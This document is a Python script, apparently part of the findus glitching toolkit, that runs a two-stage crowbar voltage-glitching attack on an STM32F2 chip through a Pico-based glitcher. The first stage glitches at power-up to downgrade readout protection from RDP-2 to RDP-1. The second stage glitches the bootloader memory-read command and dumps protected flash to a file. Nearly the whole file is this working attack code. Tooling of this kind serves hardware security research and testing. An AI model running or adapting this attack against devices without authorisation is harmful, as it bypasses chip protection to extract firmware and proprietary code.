#!/usr/bin/env python3
# Copyright (C) 2024 Dr. Matthias Kesenheimer - All Rights Reserved.
# You may use, distribute and modify this code under the terms of the GPL3 license.
#
# You should have received a copy of the GPL3 license with this file.
# If not, please write to: m.kesenheimer@gmx.net.

# Run:
# python stm32f2-bootloader-memread-crowbar.py --rpico /dev/tty.usbmodem1401 --length 110 130 --delay 188_900 189_500 --target /dev/tty.usbmodem1103 --delay2 105_000 106_000 --length2 10 100

import argparse
import logging
import random
import sys
import time

# import custom libraries
from findus import Database, PicoGlitcher, STM32Bootloader, Helper, ErrorHandling

class RDP2Characterize():
    def classify(self, state:bytes) -> str:
        color = 'C'
        if b'error' in state:
            color = 'G'
        elif b'warning' in state:
            color = 'O'
        elif b'timeout' in state:
            color = 'Y'
        elif b'ok' in state:
            color = 'R'
        return color

experiment_id = 0

class Main:
    def __init__(self, args, glitcher, database, bootcom):
        self.args = args

        # logging
        logging.basicConfig(filename="execution.log", filemode="a", format="%(asctime)s %(message)s", level=logging.INFO, force=True)

        # take over the glitcher from Main2
        self.glitcher = glitcher

        # choose crowbar glitching
        self.glitcher.set_lpglitch()

        # trigger on the rising edge of the voltage of the V_CAP line
        self.glitcher.tio_trigger(pin_trigger='ext1', edge_type='rising')

        # set up the database
        self.database = database
        self.start_time = int(time.time())

        # STM32 bootloader communication
        self.bootcom = bootcom
        self.rdp2characterize = RDP2Characterize()

    def run(self):
        # log execution
        logging.info(" ".join(sys.argv))

        s_delay = self.args.delay[0]
        e_delay = self.args.delay[1]
        s_length = self.args.length[0]
        e_length = self.args.length[1]

        global experiment_id
        self.glitcher.release_reset()
        while True:
            # set up glitch parameters (in nano seconds) and arm glitcher
            delay = random.randint(s_delay, e_delay)
            length = random.randint(s_length, e_length)

            # disable vtarget
            self.glitcher.disable_vtarget()
            time.sleep(0.05)

            # arm
            self.glitcher.arm(delay, length)

            # enable vtarget (this triggers the glitch)
            self.glitcher.enable_vtarget()

            # block until glitch
            try:
                self.glitcher.block(timeout=0.1)
            except Exception as _:
                print("[-] Timeout received in block(). Continuing.")
                state = b'warning: timeout'
            
            # setup bootloader communication
            time.sleep(0.15)
            state = self.bootcom.init_bootloader()

            # classify state
            color = self.rdp2characterize.classify(state)

            # add to database
            self.database.insert(experiment_id, delay, length, color, state)

            # monitor
            #print(response)
            speed = self.glitcher.get_speed(self.start_time, experiment_id)
            experiment_base_id = self.database.get_base_experiments_count()
            print(self.glitcher.colorize(f"[+] Experiment {experiment_id}\t{experiment_base_id}\t({speed})\t{delay}\t{length}\t{color}\t{state}", color))

            # increase experiment id
            experiment_id += 1

            if b'ok' in state:
                # hand execution over to Main2
                break

class Main2:
    def __init__(self, args, glitcher, database, bootcom, dump_filename):
        self.args = args

        # logging
        logging.basicConfig(filename="execution.log", filemode="a", format="%(asctime)s %(message)s", level=logging.INFO, force=True)

        # take over the glitcher from Main
        self.glitcher = glitcher

        # choose crowbar glitching
        self.glitcher.set_lpglitch()

        # enable vtarget
        self.glitcher.enable_vtarget()

        # we want to trigger on x11 with the configuration 8e1
        # since our statemachine understands only 8n1,
        # we can trigger on x22 with the configuration 9n1 instead
        # Update: Triggering on x11 in configuration 8n1 works good enough.
        self.glitcher.uart_trigger(pattern=0x11, pin_trigger="default")

        # set up the database
        self.database = database
        self.start_time = int(time.time())

        # STM32 bootloader communication
        self.bootcom = bootcom
        self.dump_filename = dump_filename

        # error handling
        self.error_handler = ErrorHandling(max_fails=20, look_back=30, database=self.database)

    def run2(self):
        # log execution
        logging.info(" ".join(sys.argv))

        s_delay = self.args.delay2[0]
        e_delay = self.args.delay2[1]
        s_length = self.args.length2[0]
        e_length = self.args.length2[1]

        # bring target to a known state
        self.glitcher.reset_target(0.1)

        global experiment_id
        experiment_id_start = experiment_id
        global run
        run = True
        while run:
            # set up glitch parameters (in nano seconds) and arm glitcher
            delay = random.randint(s_delay, e_delay)
            length = random.randint(s_length, e_length)

            # flush if necessary
            self.bootcom.flush_v2(timeout=0.1)

            # arm
            self.glitcher.arm(delay, length)

            # reset target
            self.glitcher.reset_target(0.01)
            time.sleep(0.15)

            # setup bootloader communication
            state = self.bootcom.init_bootloader()
            # setup memory read; this function triggers the glitch
            if b'ok' in state:
                state = self.bootcom.setup_memread()

            # block until glitch
            try:
                self.glitcher.block(timeout=0.2)
            except Exception as _:
                print("[-] Timeout received in block(). Continuing.")
                state = b'warning: timeout'

            # dump memory
            mem = b''
            if b'success' in state:
                state, mem = self.bootcom.dump_memory_to_file(self.dump_filename)

            # classify response
            color = self.glitcher.classify(state)

            # add to database
            state_str = state + mem
            self.database.insert(experiment_id, delay, length, color, state_str)

            # monitor
            speed = self.glitcher.get_speed(self.start_time, experiment_id)
            experiment_base_id = self.database.get_base_experiments_count()
            print(self.glitcher.colorize(f"[+] Experiment {experiment_id}\t{experiment_base_id}\t({speed})\t{delay}\t{length}\t{color}\t{state_str}", color))

            # increase experiment id
            experiment_id += 1

            # check for successive errors, start over if too many successive errors occur.
            def error_action():
                # go back to the first stage
                print("[-] Consecutive errors. Starting over.")
                global run
                run = False
            self.error_handler.check(experiment_id=experiment_id, response=state, expected=b'expected', user_action=error_action)

            # start over if no success after a certain number of experiments
            if experiment_id >= experiment_id_start + 1000:
                run = False

            # Dump finished
            if state == b'success: dump finished':
                print("[+] Dump finished.")
                sys.exit(0)

            # Dump failed (flash deleted)
            #if b'\xff\xff\xff\xff\xff\xff\xff\xff' in mem:
            #    print("[-] Dump failed. Flash probably erased. Check and try again.")
            #    sys.exit(0)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=False, help="target port", default="/dev/ttyUSB1")
    parser.add_argument("--rpico", required=False, help="rpico port", default="/dev/ttyUSB2")
    parser.add_argument("--delay", required=True, nargs=2, help="delay start and end", type=int)
    parser.add_argument("--length", required=True, nargs=2, help="length start and end", type=int)
    parser.add_argument("--delay2", required=True, nargs=2, help="delay for stage 2 (bootloader attack)", type=int)
    parser.add_argument("--length2", required=True, nargs=2, help="length for stage 2 (bootloader attack)", type=int)
    parser.add_argument("--resume", required=False, action='store_true', help="if an previous dataset should be resumed")
    parser.add_argument("--no-store", required=False, action='store_true', help="do not store the run in the database")
    parser.add_argument("--stage-1", required=False, action='store_true', help="aattack on stage 1 only (downgrade from RDP-2 to RDP-1)")
    parser.add_argument("--stage-2", required=False, action='store_true', help="aattack on stage 2 only (downgrade from RDP-1 to RDP-0)")
    args = parser.parse_args()

    # init the glitcher and hand it over to main
    glitcher = PicoGlitcher()
    glitcher.init(port=args.rpico, enable_vtarget=False)

    # set up database for both stages
    database = Database(sys.argv, resume=args.resume, nostore=args.no_store)

    # memory read settings
    bootcom = STM32Bootloader(port=args.target, serial_timeout=0.1, dump_address=0x08000000, dump_len=0x2000)
    dump_filename = f"{Helper.timestamp()}_memory_dump.bin"

    while True:
        print("[+] Starting...")
        glitcher.power_cycle_reset(0.2)

        if not args.stage_2:
            main = Main(args, glitcher, database, bootcom)
            try:
                main.run()
            except KeyboardInterrupt:
                print("\nExitting...")
                sys.exit(1)

        if not args.stage_1:
            main2 = Main2(args, glitcher, database, bootcom, dump_filename)
            try:
                main2.run2()
            except KeyboardInterrupt:
                print("\nExitting...")
                sys.exit(1)
